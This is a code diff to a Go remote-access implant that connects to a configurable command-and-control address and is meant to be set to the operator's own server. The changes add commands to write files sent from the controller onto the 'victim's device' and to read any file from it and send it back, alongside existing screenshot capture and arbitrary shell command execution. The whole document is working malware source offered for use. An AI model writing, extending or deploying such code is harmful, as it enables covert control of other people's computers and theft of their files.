@@ -18,7 +18,7 @@ import (
 
 const (
 	// replace the C2 variable with your C2 IP and port to connect to
-	C2 string = "127.0.0.1:12345"
+	C2 string = "127.0.0.1:54321"
 )
 
 func main() {
@@ -50,6 +50,20 @@ func main() {
 		} else if cmd == "capturescr" {
 			result := take_screenshot()
 			send_resp(conn, fmt.Sprintf("img:%s", result))
+		} else if strings.Split(cmd, ":")[0] == "file" {
+			// receiving file from C2
+			tmp := strings.Split(cmd, ":")
+			b64_string := tmp[1]
+			file_name := tmp[2]
+			if !save_file(file_name, b64_string) {
+				send_resp(conn, fmt.Sprintf("Failed to save %s", file_name))
+			} else {
+				send_resp(conn, fmt.Sprintf("%s saved successfully", file_name))
+			}
+		} else if strings.Split(cmd, " ")[0] == "download" { 
+			tgt_file := strings.Split(cmd, " ")[1]
+			result := get_file(tgt_file)
+			send_resp(conn, result)
 		} else {
 			send_resp(conn, exec_cmd(cmd))
 		}
@@ -77,6 +91,35 @@ func exec_cmd(cmd string) string {
 		return err.Error()
 	} else {
 		return string(result)
+	}
+}
+
+// check whether or not a file exists
+func file_exists(file string) (bool) {
+	if _, err := os.Stat(file); err != nil {
+		return false
+	} else {
+		return true
+	}
+}
+
+// return the base64 encoding of a file on victim's device
+func get_file(file string) (string) {
+	if !file_exists(file) {
+		return "File not found"
+	} 
+	content, _ := os.ReadFile(file)
+	b64_string := b64.StdEncoding.EncodeToString(content)
+	return b64_string
+}
+
+// save the uploaded file to victim's device
+func save_file(file string, b64_string string) (bool) {
+	content, _ := b64.StdEncoding.DecodeString(b64_string)
+	if err := os.WriteFile(file, content, 0644); err != nil {
+		return false
+	} else {
+		return true
 	}
 }
 
